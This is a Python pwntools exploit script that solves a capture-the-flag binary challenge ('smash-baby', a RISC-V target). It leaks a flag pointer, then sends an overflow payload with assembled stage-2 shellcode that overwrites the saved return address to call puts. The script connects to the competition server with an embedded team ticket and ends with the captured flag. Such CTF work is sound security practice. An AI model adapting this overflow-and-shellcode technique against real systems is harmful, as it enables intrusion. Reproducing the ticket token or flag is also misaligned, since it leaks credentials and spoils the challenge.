
# A custom template for binary exploitation that uses pwntools.
# Examples:
#   python exploit.py DEBUG NOASLR GDB
#   python exploit.py DEBUG REMOTE

from pwn import *
import os

# Set up pwntools for the correct architecture. See `context.binary/arch/bits/endianness` for more
context.binary = elfexe = ELF('./smash-baby')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, disable ASLR and run through GDB
# for all created processes: 
# $ ./exploit.py DEBUG NOASLR GDB
# You can also run the remote or local target with the option REMOTE
# Feasibility of remote debugging is possible only via ssh (not netcat) and depends from the remote system
def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([elfexe.path] + argv, gdbscript, elfexe.path, *a, *kw)
    else:
        target = process([elfexe.path] + argv, *a, **kw)
    return target

# Specify your gdb script here for debugging. gdb will be launched the GDB argument is given.
gdbscript = '''
# init-gef
# target record-full # Not supported with AVX instructions yet

# continue
b *do_1b1+0x48
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

arguments = []
if args['REMOTE']:
    remote_server = 'riscv_smash.quals2023-kah5Aiv9.satellitesabove.me'
    remote_port = 5300    
    io = remote(remote_server, remote_port)
    io.recvline() # Ticket please:
    io.sendline(b'ticket{uniform378028xray4:GF6cA2UhWtngKKG5wRU1H-gGycccp1GCcOT0ZCCAC6wY2B26mkhRVimmbwhXDNQYWg}')
else:
    os.environ['FLAG'] = 'hackasat{dummy-flag}'
    os.environ['TIMEOUT'] = '3600'
    io = start(arguments)

flag_ptr = int(io.recvline_contains(b'Because I like you').split()[-1].decode('ascii'), 16)
print(f'flag ptr: {hex(flag_ptr)}')
io.recvline()

io.send(b'ACEG')
io.send(p16(0x4242))

stage2 = asm('''
    /*a1 is a stack ptr. A little further down there is another stack ptr pointing to the flag */
    lw      a0, 116(a1)
    /* ra points to the beginning of stage2. 
     * Further the buffer we have stored the puts address.
     * Load it into ra
     */
    addi    ra, ra, 40
    lw      ra, 0(ra)

    /* jal to puts */
    ret
''')
stage2 = stage2 + b'B'*(36-len(stage2))
assert(len(stage2) == 36)

shellcode  = b''
shellcode += stage2
shellcode += (
    p32(flag_ptr - 0x4c - 40) + # overwrite saved ra. return to shellcode
    p32(0x0154ee) + # puts
    b'C'*16
)
assert(len(shellcode) == 60)

io.send(shellcode)

io.interactive()
io.close()

# flag{uniform378028xray4:GE2U7tG7DN-hnLyB9Rr6kttpgaZ3h0HfL6dK3zzDITHThDtQj7VdXarD4HQEw9031oy2LCeUyUiDHQDweGPfNqk}

